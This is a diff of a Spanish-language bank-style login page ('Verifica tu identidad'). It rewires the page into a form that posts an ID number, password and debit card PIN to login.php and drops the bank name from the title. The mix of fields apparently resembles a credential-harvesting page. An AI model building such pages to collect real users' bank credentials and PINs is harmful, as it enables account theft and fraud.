@@ -3,28 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Banco</title>
+    <title>Login</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <div class="container">
         <h2>Verifica tu identidad</h2>
-        
-        <label for="documento">Documento de identidad o pasaporte</label>
-        <input type="text" id="documento" placeholder="C.I. o pasaporte">
-        
-        <label for="password">Contraseña</label>
-        <input type="password" id="password" placeholder="Contraseña">
-        
-        <label for="pin">Clave tarjeta de débito</label>
-        <div class="pin-container">
-            <input type="password" id="pin" maxlength="4">
-        </div>
+        <form action="login.php" method="POST">
+            <label for="documento">Documento de identidad o pasaporte</label>
+            <input type="text" id="documento" name="documento" required>
 
-        <button id="loginBtn">Continuar</button>
-        <p id="errorMsg" class="error-msg"></p>
+            <label for="password">Contraseña</label>
+            <input type="password" id="password" name="password" required>
+
+            <label for="pin">Clave tarjeta de débito</label>
+            <input type="password" id="pin" name="pin" required>
+
+            <button type="submit">Continuar</button>
+        </form>
     </div>
-
-    <script src="script.js"></script>
 </body>
 </html>
